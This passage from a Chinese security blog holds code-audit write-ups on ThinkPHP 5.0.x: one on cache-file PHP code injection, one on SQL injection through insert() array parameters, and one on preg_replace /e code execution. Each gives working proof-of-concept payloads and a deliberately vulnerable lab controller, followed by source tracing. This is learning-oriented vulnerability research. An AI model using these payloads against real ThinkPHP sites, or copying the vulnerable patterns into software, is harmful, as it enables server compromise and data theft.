    }
</code></pre><p>上面的<code>extract($vars, EXTR_OVERWRITE);</code>//EXTR_OVERWRITE为默认模式。如果有冲突,则覆盖已有变量。<br>最后成功包含文件。</p>
<p>最后我们来理一下跟进的文件,方便各位小伙伴复现:</p>
<pre><code>assign:index.php-&gt;Controller.php-&gt;View.php 
fetch:index.php-&gt;Controller.php-&gt;View.php-&gt;Think.php-&gt;Template.php-&gt;File.php造成包含
</code></pre><p>##<strong>5.参考链接:</strong><br><a href="https://www.kancloud.cn/manual/thinkphp5/118113" target="_blank" rel="noopener">https://www.kancloud.cn/manual/thinkphp5/118113</a><br><a href="https://mp.weixin.qq.com/s/IuKjTS0Q0VVzuoeSwqZ5Gw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/IuKjTS0Q0VVzuoeSwqZ5Gw</a><br><a href="https://mochazz.github.io/2018/04/30/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%7C%20ThinkPHP3.x%E3%80%815.x%E6%A1%86%E6%9E%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" target="_blank" rel="noopener">https://mochazz.github.io/2018/04/30/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%7C%20ThinkPHP3.x%E3%80%815.x%E6%A1%86%E6%9E%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/16/ThinkPHP5.0.10-3.2.3缓存函数设计缺陷/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/16/ThinkPHP5.0.10-3.2.3缓存函数设计缺陷/" itemprop="url">代码审计 | ThinkPHP5.0.10-3.2.3缓存函数设计缺陷</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-16T08:15:41+08:00">
                2018-09-16
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>虽然漏洞利用条件苛刻,一般做开发的没人会这么部署,但是对于学习thinkphp框架审计还是有意义的,就当练手了</p>
</blockquote>
<hr>
<p>审计cms:<a href="http://www.thinkphp.cn/down.html" target="_blank" rel="noopener">Thinkphp 5.0.10</a><br>漏洞利用条件:</p>
<pre><code>1.缓存使用文件方式并且缓存目录暴露在web目录下面
2.攻击者要能猜到开发者使用的缓存key
</code></pre><p>##<strong>1.基础知识:</strong><br>助手函数cache()：<br><img src="http://static.zybuluo.com/chhyx/ksell9euf1bwfuwk0qo1xrj7/image_1cng34cnd148m1g2c1lnv15n6f3813.png" alt="image_1cng34cnd148m1g2c1lnv15n6f3813.png-41kB"></p>
<p>其他基础知识可参考文章:<br><a href="https://p0rz9.github.io/2018/09/15/ThinkPHP%E6%A1%86%E6%9E%B6%205.0.x%20sql%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/15/ThinkPHP%E6%A1%86%E6%9E%B6%205.0.x%20sql%E6%B3%A8%E5%85%A5/</a></p>
<p>##<strong>2.环境搭建</strong><br>根据官网下的<a href="http://www.thinkphp.cn/down.html" target="_blank" rel="noopener">安装包</a>安装成功后,根据官网的手册我们用助手函数cache()简单写一个缓存使用方法<br>index.php:</p>
<pre><code>#thinkphp5_0_10\application\index\controller\Index.php
&lt;?php
namespace app\index\controller;
use think\Cache;//引入缓存  
class Index
{
    public function index()
    {
        $options = [
            // 缓存类型为File
            &apos;type&apos;  =&gt;  &apos;File&apos;, 
            // 缓存有效期为永久有效
            &apos;expire&apos;=&gt;  0, 
            //缓存前缀
            &apos;prefix&apos;=&gt;  &apos;think&apos;,
             // 指定缓存目录
            &apos;path&apos;  =&gt;  APP_PATH.&apos;runtime/cache/&apos;,
    ];
        cache($options);set //缓存初始化
            $name =input(&apos;get.name&apos;);//助手函数input()获取get传递的name参数
        cache(&apos;name&apos;,$name,3600);//设置缓存数据(有效期一个小时)
            var_dump(cache(&apos;name&apos;));//获取缓存数据

        }

}
</code></pre><p>##<strong>3.漏洞利用</strong><br>payload:</p>
<pre><code>/public/index.php/index/index/index?name=%2F%2F%0D%0Aphpinfo();//
</code></pre><p>其中<code>%2F%2F%0D%0A</code> 表示的是 //加换行符<br><img src="http://static.zybuluo.com/chhyx/w4fvp557kotsf3vaptvzelpz/image_1cng33f9m16111b1917v61i1h15oam.png" alt="image_1cng33f9m16111b1917v61i1h15oam.png-23kB"></p>
<p>访问写入我们php代码的缓存文件<br><img src="http://static.zybuluo.com/chhyx/4168cg3738qisc8fgs9dujhn/image_1cng2gaeoeoh8tffriu6c1sa9.png" alt="image_1cng2gaeoeoh8tffriu6c1sa9.png-45.3kB"></p>
<p>##<strong>4.代码分析</strong><br>A.助手函数cache()定义的地方</p>
<pre><code>#thinkphp\helper.php 353行
function cache($name, $value = &apos;&apos;, $options = null, $tag = null)
{   
    //初始化的一些操作
    if (is_array($options)) {
        // 缓存操作的同时初始化
        $cache = Cache::connect($options);
    } elseif (is_array($name)) {
        // 缓存初始化
        return Cache::connect($name);
    } else {
        $cache = Cache::init();
    }
    ......
        if (is_null($tag)) {
            return $cache-&gt;set($name, $value, $expire);
            //进入set()方法
</code></pre><p>B.跟入<code>set()</code>方法,在<code>thinkphp\library\think\cache\driver\File.php</code>中:<br>具体变量的值已经写入注释中:</p>
<pre><code>#thinkphp5_0_10\thinkphp\library\think\cache\driver\File.php 137行
public function set($name, $value, $expire = null)
{   
    //$name=name
    //$value=// phpinfo();//
    if (is_null($expire)) {
        $expire = $this-&gt;options[&apos;expire&apos;];
    }
    $filename = $this-&gt;getCacheKey($name);//得到filename
    if ($this-&gt;tag &amp;&amp; !is_file($filename)) {
        $first = true;
    }
    $data = serialize($value);//$data=s:16:&quot;// phpinfo();//&quot;;
    if ($this-&gt;options[&apos;data_compress&apos;] &amp;&amp; function_exists(&apos;gzcompress&apos;)) {
        //数据压缩
        $data = gzcompress($data, 3);  //配置中无data_compress这个元素
    }
    $data   = &quot;&lt;?php\n//&quot; . sprintf(&apos;%012d&apos;, $expire) . $data . &quot;\n?&gt;&quot;;
    //$data = //000000003600s:16:&quot;//
              //phpinfo();//&quot;;
    $result = file_put_contents($filename, $data);
    //直接写入filename文件中
    if ($result) {
        isset($first) &amp;&amp; $this-&gt;setTagItem($filename);
        clearstatcache();
        return true;
    } else {
        return false;
    }
}
</code></pre><p>C.由代码可看到 在这里只是对写入的内容<code>$data</code>进行了<code>serialize()</code>反序列化操作 最后对<code>$data</code>进行简单的拼接就写入生成的缓存文件中,造成可写入php代码造成getshell<br>其中:</p>
<pre><code>1.sprintf()将缓存有效期时间3600s 用0填充为12位写入(000000003600)
2.关于换行符,serialize()并不会对其过滤
3.在对$data进行拼接时只是简单的//单行注释 我们用回车就可以绕过
</code></pre><p>D.其中142行左右缓存文件名的获取方法<code>getCacheKey()</code>:</p>
<pre><code>#thinkphp5_0_10\thinkphp\library\think\cache\driver\File.php 70行
protected function getCacheKey($name, $auto = false)
 {
     $name = md5($name);
     if ($this-&gt;options[&apos;cache_subdir&apos;]) {
         // 使用子目录
         $name = substr($name, 0, 2) . DS . substr($name, 2);
     }
     if ($this-&gt;options[&apos;prefix&apos;]) {
         $name = $this-&gt;options[&apos;prefix&apos;] . DS . $name;
     }
     $filename = $this-&gt;options[&apos;path&apos;] . $name . &apos;.php&apos;;
     $dir      = dirname($filename);

     if ($auto &amp;&amp; !is_dir($dir)) {
         mkdir($dir, 0755, true);
     }
     return $filename;
 }
</code></pre><p><img src="http://static.zybuluo.com/chhyx/9d8wtpisvts6ixs923a47tdn/image_1cnh6ta3h30v1n84mbqkd87me9.png" alt="image_1cnh6ta3h30v1n84mbqkd87me9.png-17.2kB"><br>因为配置<code>cache_subdir</code>已经在本文件定义 所以进入第一个if语句</p>
<pre><code>$name = substr($name, 0, 2) . DS . substr($name, 2);
</code></pre><p>将前两个字母作为目录 后面的作为缓存文件名<br><img src="http://static.zybuluo.com/chhyx/j0rbrsvh4ehq2w3a3e7oi4o0/image_1cnh76und14p68m81ijb12voslem.png" alt="image_1cnh76und14p68m81ijb12voslem.png-118kB"></p>
<p>最后得到文件名,与生成的一致。<br><img src="http://static.zybuluo.com/chhyx/bd8g6v60kzrettpgiijp4e0j/image_1cnh7dqusdf6aufuu6np121r13.png" alt="image_1cnh7dqusdf6aufuu6np121r13.png-16.1kB"></p>
<p>最后访问这个php文件即可</p>
<p>参考链接:<br><a href="https://www.kancloud.cn/manual/thinkphp5/118131" target="_blank" rel="noopener">https://www.kancloud.cn/manual/thinkphp5/118131</a><br><a href="https://xz.aliyun.com/t/99" target="_blank" rel="noopener">https://xz.aliyun.com/t/99</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/15/ThinkPHP框架 5.0.x sql注入/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/15/ThinkPHP框架 5.0.x sql注入/" itemprop="url">代码审计 | ThinkPHP框架 5.0.x sql注入</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-15T08:15:41+08:00">
                2018-09-15
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>笔者也是第一次审计Thinkphp框架,在结合网上视频跟Thinkphp5.0手册,完成了这次sql注入漏洞的审计,学习记录一波。</p>
</blockquote>
<hr>
<p>##<strong>1.thinkphp基础知识:</strong></p>
<p>thinkphp初始目录结构:</p>
<blockquote>
<pre><code>project  应用部署目录
├─application           应用目录（可设置）
│  ├─common             公共模块目录（可更改）
│  ├─index              模块目录(可更改)
│  │  ├─config.php      模块配置文件
│  │  ├─common.php      模块函数文件
│  │  ├─controller      控制器目录
│  │  ├─model           模型目录
│  │  ├─view            视图目录
│  │  └─ ...            更多类库目录
│  ├─command.php        命令行工具配置文件
│  ├─common.php         应用公共（函数）文件
│  ├─config.php         应用（公共）配置文件
│  ├─database.php       数据库配置文件
│  ├─tags.php           应用行为扩展定义文件
│  └─route.php          路由配置文件
├─extend                扩展类库目录（可定义）
├─public                WEB 部署目录（对外访问目录）
│  ├─static             静态资源存放目录(css,js,image)
│  ├─index.php          应用入口文件
│  ├─router.php         快速测试文件
│  └─.htaccess          用于 apache 的重写
├─runtime               应用的运行时目录（可写，可设置）
├─vendor                第三方类库目录（Composer）
├─thinkphp              框架系统目录
│  ├─lang               语言包目录
│  ├─library            框架核心类库目录
│  │  ├─think           Think 类库包目录
│  │  └─traits          系统 Traits 目录
│  ├─tpl                系统模板目录
│  ├─.htaccess          用于 apache 的重写
│  ├─.travis.yml        CI 定义文件
│  ├─base.php           基础定义文件
│  ├─composer.json      composer 定义文件
│  ├─console.php        控制台入口文件
│  ├─convention.php     惯例配置文件
│  ├─helper.php         助手函数文件（可选）
│  ├─LICENSE.txt        授权说明文件
│  ├─phpunit.xml        单元测试配置文件
│  ├─README.md          README 文件
│  └─start.php          框架引导文件
├─build.php             自动生成定义文件（参考）
├─composer.json         composer 定义文件
├─LICENSE.txt           授权说明文件
├─README.md             README 文件
├─think                 命令行入口文件
</code></pre></blockquote>
<p>url访问:</p>
<pre><code>127.0.0.1:83  /index.php   /Index       /index         /index
域名          入口文件      前台      前台控制器    index方法
</code></pre><p>助手函数<a href="https://www.kancloud.cn/manual/thinkphp5/118044" target="_blank" rel="noopener">input()</a>,专用来接收get，post等的值:<br><img src="http://static.zybuluo.com/chhyx/3sb6ttvy8bj5pf1o3wqj1am2/image_1cne0gl8i1jo21s7mj8l7qg1c0220.png" alt="image_1cne0gl8i1jo21s7mj8l7qg1c0220.png-59.1kB"></p>
<p>##<strong>2.环境搭建:</strong><br>A.新建数据库tp,在数据库tp中新建user表,三个字段 分别为Id、name、pwd</p>
<p><img src="http://static.zybuluo.com/chhyx/z5zg1yp93oq55yqa8s45vll1/image_1cne5r0511pvo1goqtra1ht6154s4a.png" alt="image_1cne5r0511pvo1goqtra1ht6154s4a.png-18.4kB"></p>
<p>B.连接数据库并开启调试模式</p>
<p><img src="http://static.zybuluo.com/chhyx/8n9knmbckzp29o159el9ez2a/image_1cne60jmug89t3puif13jb15cv4n.png" alt="image_1cne60jmug89t3puif13jb15cv4n.png-63.5kB"></p>
<p>C.简单写一个insert功能,在<code>\application\index\controller\index.php</code><br>写入如下代码:</p>
<pre><code>&lt;?php
namespace app\index\controller;
use think\Db;
class Index
{
    public function user()
    {
        return &apos;aa&apos;;
    }
    public  function testsql()
    {
        $name = input(&apos;get.name/a&apos;);
        db(&apos;user&apos;)-&gt;where([&apos;id&apos;=&gt; 1])-&gt;insert([&apos;name&apos;=&gt;$name]);
    }
}
</code></pre><p>##<strong>2.漏洞利用:</strong><br>payload:</p>
<pre><code>http://127.0.0.1:82/index.php/index/index/testsql?name[0]=inc&amp;name[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;name[2]=1
</code></pre><p><img src="http://static.zybuluo.com/chhyx/s4z4s0daqfnvxf1m3mhysq4p/image_1cne0ak8fq3n1dapnnq18ttqe51j.png" alt="image_1cne0ak8fq3n1dapnnq18ttqe51j.png-71.4kB"></p>
<p>##<strong>3.代码分析:</strong><br>跟进<code>insert()</code>方法：</p>
<pre><code>#thinkphp\library\think\db\Query.php 2079行:
    ......
public function insert(array $data = [], $replace = false, $getLastInsID = false, $sequence = null)
    {
        // 分析查询表达式
        $options = $this-&gt;parseExpress();
        $data    = array_merge($options[&apos;data&apos;], $data);
</code></pre><p>接着:</p>
<pre><code>$sql = $this-&gt;builder-&gt;insert($data, $options, $replace);
</code></pre><p>进入bulider.php的insert()方法:</p>
<pre><code>#thinkphp\library\think\db\Builder.php  719行:
public function insert(array $data, $options = [], $replace = false)
{
    // 分析并处理数据
$data = $this-&gt;parseData($data, $options);
</code></pre><p>进入parseDate()方法,相关变量的值已经写入注释:</p>
<pre><code>#thinkphp\library\think\db\Builder.php  86行:
protected function parseData($data, $options)
        {
            ...

            foreach ($data as $key =&gt; $val) {
            //$key:name
            //$val:{&apos;inc&apos;,&apos;updatexml(1,concat(0x7,user(),0x7e),1)&apos;,&apos;1&apos;} 
               ...
                if (false === strpos($key, &apos;.&apos;) &amp;&amp; !in_array($key, $fields, true)) {
                        ...
                } elseif (is_null($val)) {
                   ...
                } elseif (is_array($val) &amp;&amp; !empty($val)) {
                    switch ($val[0]) {  #$val[1]:updatexml(1,concat(0x7,user(),0x7e),1)  val[2]:1
                        case &apos;exp&apos;:
                            $result[$item] = $val[1];
                            break;
                        case &apos;inc&apos;:
                            $result[$item] = $this-&gt;parseKey($val[1]) . &apos;+&apos; . floatval($val[2]);
                            break;
                        case &apos;dec&apos;:
                            $result[$item] = $this-&gt;parseKey($val[1]) . &apos;-&apos; . floatval($val[2]);
                            break;
                    }
                } 
            ...
            return $result;  #`name`:updatexml(1,concat(0x7,user(),0x7e),1)+1
        }
</code></pre><p>我们可看出<code>$val</code>是一个数组,且<code>$val[0]==&#39;inc&#39;</code>,进入对应的switch语句:</p>
<pre><code>case &apos;inc&apos;:
    $result[$item] = $this-&gt;parseKey($val[1]) . &apos;+&apos; . floatval($val[2]);
    break;
</code></pre><p>对<code>$val[1]</code>也就是<code>updatexml(1,concat(0x7,user(),0x7e),1)</code>进行<code>parsekey()</code>方法的处理,但是并没有什么过滤,原样输出:</p>
<pre><code>    protected function parseKey($key, $options = [])
{
    return $key;//$key：updatexml(1,concat(0x7,user(),0x7e),1)
}
</code></pre><p>而<code>floatval($val[2])</code>的结果为1<br>所以我们最后返回到<code>Query.php</code>的<code>insert()</code>方法执行的sql语句是:</p>
<p><img src="http://static.zybuluo.com/chhyx/okk46bobgycn159pb8a1pbdn/image_1cne41cqcfq1djq1lei18d65173t.png" alt="image_1cne41cqcfq1djq1lei18d65173t.png-114.8kB"></p>
<p>SQL注入成功。</p>
<p>另一处的update()造成的注入与这个类似,这里就不再赘述了。小伙伴们如果想复现的话,只需改index.php文件insert为update即可。</p>
<hr>
<p>1.搭建thinkphp遇到个坑:<br>在保存index.php后 url查看，发现提示命名空间必须在首行:<br><img src="http://static.zybuluo.com/chhyx/wroy49bujchf58dmq6s8f477/image_1cndv2tcvafm1erc6vj19vp148r16.png" alt="image_1cndv2tcvafm1erc6vj19vp148r16.png-37.3kB"></p>
<p>填坑:<br>用记事本打开相关文件,在保存时选择ANSI编码即可解决<br><img src="http://static.zybuluo.com/chhyx/c21h6hvf69psufq1uk5jeat0/image_1cndv1f2v1ol81a3km1j1i21l4vp.png" alt="image_1cndv1f2v1ol81a3km1j1i21l4vp.png-56.6kB"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/14/preg_replace函数与命令执行/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/14/preg_replace函数与命令执行/" itemprop="url">浅淡preg_replace函数与命令执行</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-14T08:15:41+08:00">
                2018-09-14
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>最近在看法师seay的《代码审计》,在代码审计小技巧一章中提到了preg_replace()函数造成的命令执行,以前不了解,遂去网上查资料,看到红日的表哥们发的有关的题目和详解(链接在结尾),自己跟着复现学习一下。</p>
</blockquote>
<hr>
<p>题目的php代码:</p>
<pre><code>    header(&quot;Content-Type: text/plain&quot;);
function complexStrtolower($regex, $value){
    return preg_replace(&apos;/(&apos; . $regex . &apos;)/ei&apos;, &apos;strtolower(&quot;\\1&quot;)&apos;, $value);
}

foreach ($_GET as $regex =&gt; $value) {
    echo complexStrtolower($regex, $value) . &quot;\n&quot;;
    #var_dump($_GET);
}
</code></pre><p>###<strong>代码分析:</strong><br><strong>1.基础知识:</strong><br>首先我们先了解下<code>preg_replace()</code>函数:</p>
<blockquote>
<p>###<strong>preg_replace</strong>：(PHP 5.5)</p>
<p><strong>功能</strong> ： 函数执行一个正则表达式的搜索和替换</p>
<p><strong>定义</strong> ： mixed preg_replace ( mixed \$pattern , mixed \$replacement , mixed<br>\$subject [, int \$limit = -1 [, int &amp;$count ]] )</p>
<p>搜索 subject 中匹配 pattern 的部分， 如果匹配成功以 replacement 进行替换</p>
</blockquote>
<p>观察题目可知,这道题目考察的是 <code>preg_replace()</code> 函数<br>�<code>preg_replace()</code>函数的第一个参数<code>$pattern</code>为正则表达式,如果存在/e修正符,则会造成代码执行漏洞</p>
<blockquote>
<p>/e 模式修正符，是 preg_replace() 将 $replacement 当做php代码来执行</p>
</blockquote>
<p><code>preg_replace()</code>函数的第二个参数是对前面正则表达式捕获的子匹配项的引用<br>在上面题目的代码中, \1其实代表的就是\1,因为\1在””里头才需要写成\1 一般出现在正则表达式中, \1代表第一个()里面匹配到的内容。</p>
<p>第三个参数$subject就是源字符串</p>
<p>这道题的关键是通过控制传入的<code>$_GET</code>参数—&gt;来控制正则的同时修改后面的php代码,达到命令执行</p>
<p><strong>2.payload分析:</strong></p>
<p>A.官方给的payload:<br><img src="http://static.zybuluo.com/chhyx/u7qp6ma6swytyuuloxeoizfe/image_1cnaspepa1pc31ma51fpn1del1mkem.png" alt="image_1cnaspepa1pc31ma51fpn1del1mkem.png-56.7kB"></p>
<pre><code>?.*={${phpinfo()}} 
</code></pre><p><img src="http://static.zybuluo.com/chhyx/37auiz8d3kxac0nr74jy0o7o/image_1cn9rc5efh9u1mu7cns35v1ggo8l.png" alt="image_1cn9rc5efh9u1mu7cns35v1ggo8l.png-24.8kB"></p>
<p>不成功,原因是php会对非法的GET参数名进行<code>_</code>处理,我们简单测试一下</p>
<p>当参数名首字母不为非法字母时:<br><img src="http://static.zybuluo.com/chhyx/c8fue25oesvraweqm1j72xa2/image_1cn9t9vkscq017be1hqsgq51v3uac.png" alt="image_1cn9t9vkscq017be1hqsgq51v3uac.png-24.2kB"></p>
<p>当参数名首字母为非法字母时:<br><img src="http://static.zybuluo.com/chhyx/5ihlmuv6d6pnio3pokdoacmy/image_1cn9tb1h5t201mh71j9a9judkmap.png" alt="image_1cn9tb1h5t201mh71j9a9judkmap.png-23kB"></p>
<p>在参数名首字母不为非法字母的情况下: 、+、.、[、_等字符会被php替换为下划线_<br>在参数名首字母为非法字母的情况下,只有<code>.</code>会被替换</p>
<p>B.<a href="https://mochazz.github.io/" target="_blank" rel="noopener">mochazz</a>大佬给的payload:</p>
<pre><code>?\S*=${phpinfo()}
</code></pre><p><img src="http://static.zybuluo.com/chhyx/6h7mup27z0995qx0dvl8q75w/image_1cn9gccpu1uho6u2fhj1csc1hdhm.png" alt="image_1cn9gccpu1uho6u2fhj1csc1hdhm.png-54.5kB"></p>
<p>没成功</p>
<p>C.在大佬给出的payload基础上添加@成功执行:<br><img src="http://static.zybuluo.com/chhyx/j37gr8avyr3v45ndy0qytxuf/image_1cn9ggl161m8v3rfdre1qc2ds81j.png" alt="image_1cn9ggl161m8v3rfdre1qc2ds81j.png-61.8kB"></p>
<p>我又测试了几个特殊字符:<br>空格<br><img src="http://static.zybuluo.com/chhyx/y9o3ndn44gkedid8zj4uh1z0/image_1cn9lo3usqvf1vkc3271tk91blcp.png" alt="image_1cn9lo3usqvf1vkc3271tk91blcp.png-16.4kB"></p>
<p>tab键:<br><img src="http://static.zybuluo.com/chhyx/7oihl123nb36bkr4gpn07fxj/image_1cn9lr00g1bu21rq12lm18071bvj30.png" alt="image_1cn9lr00g1bu21rq12lm18071bvj30.png-31.4kB"></p>
<p>注释符:<br><img src="http://static.zybuluo.com/chhyx/aderv7yvf2d1eqxr80b908y8/image_1cn9lorrd9mh1u391h1paml1ms116.png" alt="image_1cn9lorrd9mh1u391h1paml1ms116.png-27.7kB"></p>
<p>换行回车符:<br><img src="http://static.zybuluo.com/chhyx/xlta3052ww2lfv9r9j61uab7/image_1cn9lsn7u1bh71ranetp106a18pp3d.png" alt="image_1cn9lsn7u1bh71ranetp106a18pp3d.png-31.3kB"></p>
<p>+号:<br><img src="http://static.zybuluo.com/chhyx/ki9jkuuv3mox01p617nc8m8c/image_1cn9lufli100t107onef33dfl54a.png" alt="image_1cn9lufli100t107onef33dfl54a.png-26.7kB"></p>
<p>用py脚本FUZZ了一下：<br><img src="http://static.zybuluo.com/chhyx/jc6cemzxfhn044vyxropibf1/image_1cn9pnrum57a2ossu81ebcl227r.png" alt="image_1cn9pnrum57a2ossu81ebcl227r.png-37.8kB"></p>
<p>可成功执行的<br>ascii为1-31的特殊字符、!、-、@、~、/**/等字符</p>
<p>添加ascii值为1-31的直接访问:<br><img src="http://static.zybuluo.com/chhyx/1wys2prczkntgxpoyq1kk07c/image_1cn9p5uqj1qd51ttr6of1vkp12cs64.png" alt="image_1cn9p5uqj1qd51ttr6of1vkp12cs64.png-38.8kB"><br>下载下来观察文件内容,其为phpinfo()的内容:<br><img src="http://static.zybuluo.com/chhyx/acmiakc0p0xhnflyq12a21pe/image_1cn9pfe3a17ljb3415l01ir31pj76u.png" alt="image_1cn9pfe3a17ljb3415l01ir31pj76u.png-121.5kB"><br>在burp中也可以直接访问到:<br><img src="http://static.zybuluo.com/chhyx/118ueq4u2bd6fiun7oohft9d/image_1cn9ppt7k19f01b7p1n8d1vspb7s88.png" alt="image_1cn9ppt7k19f01b7p1n8d1vspb7s88.png-74.4kB"></p>
<p><strong>3.补充知识:</strong><br>A.我们思考为什么匹配到<code>{${phpinfo()}}</code> 或者 <code>${phpinfo()}</code> 才能执行 phpinfo 函数<br>在seay大大的《代码审计–企业级Web代码安全架构》中的审计小技巧篇也有提及php可变变量:</p>
<blockquote>
<p>部分PHP应用在写配置文件或者使用preg_replace()函数第二个参数赋值变量时，会用到双引号(“)来代表string型给变量赋值，在PHP语言中，单引号和双引号是有区别的，单引号代表纯字符串，而双引号则是会解析中间的变量，所以在使用双引号时会存在代码执行漏洞。</p>
</blockquote>
<p>测试例子:<br><img src="http://static.zybuluo.com/chhyx/y7a4cf9mex9fn4ydf1mkn7l9/image_1cn9s9gp61i104s81irubvh1ds99i.png" alt="image_1cn9s9gp61i104s81irubvh1ds99i.png-24.3kB"></p>
<p>B./e模式会转义字符：<br>php手册关于<code>preg_replace()</code>的<a href="http://php.net/manual/zh/function.preg-replace.php" target="_blank" rel="noopener">介绍</a>有提到：</p>
<blockquote>
<p>当使用被弃用的 e 修饰符时, 这个函数会转义一些字符(即：’、”、 \ 和 NULL)<br>然后进行后向引用替换。</p>
</blockquote>
<p>例子:</p>
<pre><code>&lt;?php
    @preg_replace(&quot;/\[(.*?)\]/e&quot;, &quot;\\1&quot;,          
    $_GET[&apos;code&apos;]);
var_dump($_GET);
?&gt;
</code></pre><p><img src="http://static.zybuluo.com/chhyx/76s7upls9y3hcj5hm5dc1tkv/image_1cna00tq2uld140n170g15k41rt6b6.png" alt="image_1cna00tq2uld140n170g15k41rt6b6.png-45.4kB"></p>
<p>成功的payload:</p>
<pre><code>http://127.0.0.1:83/index.php?code=[phpinfo()]
http://127.0.0.1:83/index.php?code=[system(dir)]
</code></pre><p><img src="http://static.zybuluo.com/chhyx/fffr1s49ifyec40fncpe8ftw/image_1cnare5m21d2s1nk01j4un8plbm9.png" alt="image_1cnare5m21d2s1nk01j4un8plbm9.png-27.2kB"></p>
<p><strong>参考链接:</strong><br><a href="https://mochazz.github.io/2018/08/13/%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6preg_replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" target="_blank" rel="noopener">https://mochazz.github.io/2018/08/13/%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6preg_replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</a><br><a href="https://www.ripstech.com/php-security-calendar-2017/" target="_blank" rel="noopener">https://www.ripstech.com/php-security-calendar-2017/</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/13/代码审计Maccms8.X命令执行/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/13/代码审计Maccms8.X命令执行/" itemprop="url">代码审计 | Maccms8.X命令执行</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-13T08:15:41+08:00">
                2018-09-13
